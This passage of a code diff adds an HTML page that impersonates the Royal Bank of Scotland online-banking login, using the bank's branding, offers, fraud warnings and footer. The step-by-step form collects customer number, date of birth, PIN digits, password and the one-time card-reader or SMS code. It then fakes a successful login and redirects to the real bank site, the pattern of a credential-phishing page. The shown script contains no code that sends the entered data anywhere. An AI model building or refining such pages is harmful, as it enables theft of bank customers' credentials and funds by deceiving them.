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" alt="Royal Bank of Scotland" style="width:180px;height:48px;object-fit:contain;"/></div></a>
+  <div class="header-right">
+    <a href="#">Personal</a>
+    <a href="#">Business</a>
+    <a href="#">Private Banking</a>
+    <a href="#">Help</a>
+  </div>
+</header>
+<nav>
+  <a href="#">Accounts</a>
+  <a href="#">Cards</a>
+  <a href="#">Mortgages</a>
+  <a href="#">Savings</a>
+  <a href="#" class="active">Online Banking</a>
+</nav>
+<main>
+  <div class="wrap">
+    <div class="card">
+      <div class="card-head"><h1>Log in to Online Banking</h1></div>
+      <div class="steps-bar">
+        <div class="sb active" id="sb1"><span class="sb-num">1</span> Your details</div>
+        <div class="sb" id="sb2"><span class="sb-num">2</span> PIN digits</div>
+        <div class="sb" id="sb3"><span class="sb-num">3</span> Card reader</div>
+        <div class="sb" id="sb4"><span class="sb-num">4</span> Access granted</div>
+      </div>
+      <div class="card-body">
+        <!-- STEP 1 -->
+        <div class="step active" id="step1">
+          <div class="fg">
+            <label for="cnum">Customer number</label>
+            <input type="text" id="cnum" inputmode="numeric" autocomplete="username" />
+            <p class="hint">Your customer number is 8&ndash;10 digits. It was sent to you when you registered for Online Banking.</p>
+          </div>
+          <div class="fg">
+            <label for="dob">Date of birth</label>
+            <input type="text" id="dob" placeholder="DD/MM/YYYY" />
+          </div>
+          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#">Forgotten your customer number?</a>
+            <a href="#">Register for Online Banking</a>
+          </div>
+        </div>
+        <!-- STEP 2: PIN digits -->
+        <div class="step" id="step2">
+          <div class="pin-info">
+            <strong>Enter selected digits of your PIN</strong>
+            We ask for different digits each time to keep your account safe. Never share your full PIN with anyone, including bank staff.
+          </div>
+          <div class="fg">
+            <label>Please enter the following PIN digits</label>
+            <div class="pin-row" id="rbs-pin-row"></div>
+          </div>
+          <div class="fg">
+            <label for="rpwd">Password</label>
+            <input type="password" id="rpwd" autocomplete="current-password" />
+            <p class="hint">Your password is case sensitive.</p>
+          </div>
+          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <hr />
+          <div class="links">
+            <a href="#" onclick="go(1);return false;">&larr; Back</a>
+            <a href="#">Forgotten your PIN or password?</a>
+          </div>
+        </div>
+        <!-- STEP 3: Card reader -->
+        <div class="step" id="step3">
+          <div class="reader-box">
+            <div class="reader-head">
+              <div class="reader-icon">
+                <svg width="32" height="22" viewBox="0 0 32 22" fill="none">
+                  <rect x="1" y="1" width="30" height="20" rx="2" fill="white" opacity=".9"/>
+                  <rect x="4" y="4" width="10" height="6" rx="1" fill="#3D1152"/>
+                  <rect x="18" y="6" width="4" height="4" rx="1" fill="#3D1152"/>
+                  <rect x="4" y="13" width="24" height="2" rx="1" fill="rgba(0,45,114,.3)"/>
+                </svg>
+              </div>
+              <div class="reader-title">RBS card reader
+                <small>or use the Royal Bank of Scotland app</small>
+              </div>
+            </div>
+            <ol class="r-steps">
+              <li>Insert your RBS debit card into the card reader (chip facing upwards)</li>
+              <li>Press <strong>IDENTIFY</strong> and enter your card PIN when prompted</li>
+              <li>Type the 8-digit code shown on the card reader display below</li>
+            </ol>
+          </div>
+          <div class="divider-or">Or enter a one-time passcode sent by SMS</div>
+          <div class="fg">
+            <label>Enter your 8-digit security code</label>
+            <div class="otp-boxes">
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+              <input type="text" maxlength="1" class="rbs-otp" inputmode="numeric" />
+            </div>
+          </div>
+          <p class="resend">No card reader? <a href="#" onclick="return false;">Use the RBS app</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Resend SMS code</a></p>
+          <button class="btn" onclick="goWithLoader(4,this)">Confirm &amp; Log in</button>
+          <hr />
+          <div class="links"><a href="#" onclick="go(2);return false;">&larr; Back</a></div>
+        </div>
+        <!-- STEP 4 -->
+        <div class="step" id="step4">
+          <div class="granted">
+            <div class="tick"><svg width="38" height="38" viewBox="0 0 38 38" fill="none"><path d="M8 19l8 8 14-14" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+            <h2>Login Successful</h2>
+            <p>You are now logged in to RBS Online Banking.</p>
+            <div class="redir">
+              <strong id="ctxt">Redirecting in 5 seconds</strong>
+              You will be taken to the Royal Bank of Scotland website.
+              <div class="prog-track"><div class="prog-fill" id="pfill"></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="side">
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#3D1152;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M3 6h10M10 3l3 3-3 3M15 12H5M8 15l-3-3 3-3" stroke="#3D1152" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#3D1152;background:#F0E8F6;padding:3px 10px;border-radius:20px;">Switch Offer</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#3D1152;line-height:1;margin-bottom:6px;">£200</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Switch & get £200 cash</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Switch to an RBS Reward current account using the Current Account Switch Service. £200 paid within 7 days. New to RBS customers only. T&amp;Cs and eligibility criteria apply.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#3D1152;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Switch to RBS <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#3D1152" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+      <div style="background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:14px;transition:transform .2s,box-shadow .2s;" onmouseover="this.style.transform='translateY(-3px)';this.style.boxShadow='0 8px 24px rgba(0,0,0,.14)'" onmouseout="this.style.transform='';this.style.boxShadow='0 2px 12px rgba(0,0,0,.08)'">
+        <div style="height:4px;background:#3D1152;"></div>
+        <div style="padding:16px 16px 14px;">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px;">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M2 14l4-5 4 2 5-7" stroke="#3D1152" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            <span style="font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.6px;color:#3D1152;background:#F0E8F6;padding:3px 10px;border-radius:20px;">Savings</span>
+          </div>
+          <div style="font-size:28px;font-weight:900;color:#3D1152;line-height:1;margin-bottom:6px;">6.17% AER</div>
+          <div style="font-size:13px;font-weight:700;color:#111;margin-bottom:5px;">Digital Regular Saver</div>
+          <p style="font-size:12px;color:#666;line-height:1.55;margin:0 0 12px;">Save £1–£150 per month and earn 6.17% AER variable for 12 months. Available to RBS personal current account holders.</p>
+          <a href="#" style="font-size:12px;font-weight:700;color:#3D1152;text-decoration:none;display:inline-flex;align-items:center;gap:5px;">Open a Regular Saver <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M1.5 5h7M5 1.5l3.5 3.5L5 8.5" stroke="#3D1152" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
+        </div>
+      </div>
+<div class="warn"><strong>Fraud warning:</strong> RBS will never ask for your full card reader code, full PIN, or ask you to transfer money to a safe account. <a href="#" style="color:#856404">Report fraud</a>.</div>
+      <div class="ibox">
+        <div class="ibox-h">Royal Bank of Scotland app</div>
+        <div class="ibox-b">
+          <p>Bank securely on the go with the RBS app. Generate card reader codes from your phone without the physical device.</p>
+          <p><a href="#">Download for iOS</a></p>
+          <p><a href="#">Download for Android</a></p>
+        </div>
+      </div>
+      <div class="ibox">
+        <div class="ibox-h">Need help?</div>
+        <div class="ibox-b">
+          <p><strong>03457 24 24 24</strong><br/>Available 24/7</p>
+          <p><a href="#">Help and support</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+<footer>
+  <div class="flinks">
+    <a href="#">Privacy notice</a><a href="#">Cookie policy</a><a href="#">Accessibility</a><a href="#">Terms</a><a href="#">Security</a><a href="#">Contact us</a>
+  </div>
+  <p class="fcopy">The Royal Bank of Scotland plc. Registered in Scotland (Company No. SC083026). Registered Office: 36 St Andrew Square, Edinburgh EH2 2YB.<br>Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
+</footer>
+<script>
+  var rbsPositions=[];
+  (function(){
+    var used={};
+    while(rbsPositions.length<3){var n=Math.floor(Math.random()*6)+1;if(!used[n]){used[n]=true;rbsPositions.push(n);}}
+    rbsPositions.sort(function(a,b){return a-b;});
+    var row=document.getElementById('rbs-pin-row');
+    rbsPositions.forEach(function(p){
+      var s=['1st','2nd','3rd','4th','5th','6th'][p-1];
+      var fg=document.createElement('div'); fg.className='pin-fg';
+      fg.innerHTML='<label>'+s+'</label><input type="password" maxlength="1" />';
+      row.appendChild(fg);
+    });
+  })();
+  function goWithLoader(n, btn) {
+    var origHtml = btn.innerHTML;
+    var isFinal  = n === 4;
+    btn.disabled = true;
+    btn.style.opacity = '.72';
+    btn.innerHTML = '<span style="display:inline-block;width:14px;height:14px;border:2.5px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:ld-spin .65s linear infinite;vertical-align:middle;margin-right:8px;"></span>'
+                  + (isFinal ? 'Verifying…' : 'Please wait…');
+    var ov  = document.getElementById('ld-ov');
+    var msg = document.getElementById('ld-msg');
+    msg.textContent = isFinal ? 'Verifying your details…' : 'Please wait…';
+    ov.style.display = 'flex';
+    /* double rAF forces repaint so transition fires */
+    requestAnimationFrame(function(){ requestAnimationFrame(function(){ ov.style.opacity = '1'; }); });
+    setTimeout(function() {
+      go(n);
+      setTimeout(function() {
+        ov.style.opacity = '0';
+        setTimeout(function() { ov.style.display = 'none'; }, 260);
+        /* restore button only on non-final steps */
+        if (!isFinal) {
+          btn.innerHTML = origHtml;
+          btn.disabled  = false;
+          btn.style.opacity = '1';
+        }
+      }, isFinal ? 400 : 200);
+    }, isFinal ? 1500 : 680);
+  }
+
+
+  function go(n){
+    document.querySelectorAll('.step').forEach(function(s){s.classList.remove('active');});
+    ['sb1','sb2','sb3','sb4'].forEach(function(id,i){
+      var el=document.getElementById(id); el.classList.remove('active','done');
+      if(i+1<n) el.classList.add('done'); else if(i+1===n) el.classList.add('active');
+    });
+    document.getElementById('step'+n).classList.add('active');
+    if(n===4) redirect();
+  }
+  function redirect(){
+    var s=5,fill=document.getElementById('pfill'),txt=document.getElementById('ctxt');
+    fill.style.transition='width '+s+'s linear';
+    setTimeout(function(){fill.style.width='100%';},50);
+    var iv=setInterval(function(){s--;if(s<=0){clearInterval(iv);txt.textContent='Redirecting now...';setTimeout(function(){window.location.href='https://www.rbs.co.uk';},400);}else txt.textContent='Redirecting in '+s+' second'+(s!==1?'s':'');},1000);
+  }
+  var rbsOtp=document.querySelectorAll('.rbs-otp');
+  rbsOtp.forEach(function(inp,i){
+    inp.addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'');if(this.value&&i<rbsOtp.length-1)rbsOtp[i+1].focus();});
+    inp.addEventListener('keydown',function(e){if(e.key==='Backspace'&&!this.value&&i>0)rbsOtp[i-1].focus();});
+  });
+</script>
+
+  <!-- Loading Overlay -->
+  <div id="ld-ov" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,.96);z-index:9000;display:none;flex-direction:column;align-items:center;justify-content:center;gap:20px;opacity:0;transition:opacity .25s;">
+    <div style="position:relative;width:56px;height:56px;">
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid #e8e8e8;"></div>
+      <div style="position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;border:4px solid transparent;border-top-color:#3D1152;animation:ld-spin .8s linear infinite;"></div>
+    </div>
+    <div id="ld-msg" style="font-size:14px;color:#555;font-weight:600;letter-spacing:.2px;"></div>
+  </div>
+
+  <!-- Cookie Banner -->
+  <div id="ck-bar" style="position:fixed;bottom:0;left:0;right:0;z-index:9999;">
+    <style>
+      @keyframes ckUp{from{transform:translateY(110%);opacity:0}to{transform:translateY(0);opacity:1}}
+      @keyframes ckDown{from{transform:translateY(0);opacity:1}to{transform:translateY(110%);opacity:0}}
+      #ck-bar{animation:ckUp .5s cubic-bezier(.22,1,.36,1) forwards;}
+    </style>
+    <div style="height:4px;background:#3D1152;"></div>
+    <div style="background:#111;padding:18px 28px;display:flex;align-items:center;gap:20px;flex-wrap:wrap;box-shadow:0 -6px 28px rgba(0,0,0,.5);">
+      <div style="width:48px;height:48px;background:#3D1152;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;box-shadow:0 2px 10px rgba(0,0,0,.3);">&#127850;</div>
+      <div style="flex:1;min-width:200px;">
+        <div style="font-size:14px;font-weight:800;color:#fff;margin-bottom:5px;">Royal Bank of Scotland uses cookies</div>
+        <p style="font-size:12px;color:#aaa;margin:0;line-height:1.6;">We use cookies and similar technologies to enhance your experience, remember your preferences and help us understand how our site is used. <a href="#" style="color:#b07fd4;text-decoration:underline;font-weight:600;">Read our cookie policy</a></p>
+      </div>
+      <div style="display:flex;gap:10px;flex-shrink:0;">
+        <button onclick="manageCk()" onmouseover="this.style.borderColor='#aaa';this.style.color='#fff'" onmouseout="this.style.borderColor='#555';this.style.color='#ccc'" style="padding:10px 18px;background:transparent;color:#ccc;border:1.5px solid #555;border-radius:5px;cursor:pointer;font-size:12px;font-weight:600;white-space:nowrap;">Manage preferences</button>
+        <button onclick="acceptCk()" onmouseover="this.style.opacity='.88'" onmouseout="this.style.opacity='1'" style="padding:10px 24px;background:#3D1152;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:13px;font-weight:800;white-space:nowrap;box-shadow:0 2px 8px rgba(0,0,0,.25);">Accept all cookies</button>
+      </div>
+    </div>
+  </div>
+  <script>
+    (function(){if(localStorage.getItem('ck-ok'))document.getElementById('ck-bar').style.display='none';})();
+    function acceptCk(){localStorage.setItem('ck-ok','1');var b=document.getElementById('ck-bar');b.style.animation='ckDown .35s ease forwards';setTimeout(function(){b.style.display='none';},320);}
+    function manageCk(){acceptCk();}
+  </script>
+</body>
+</html>
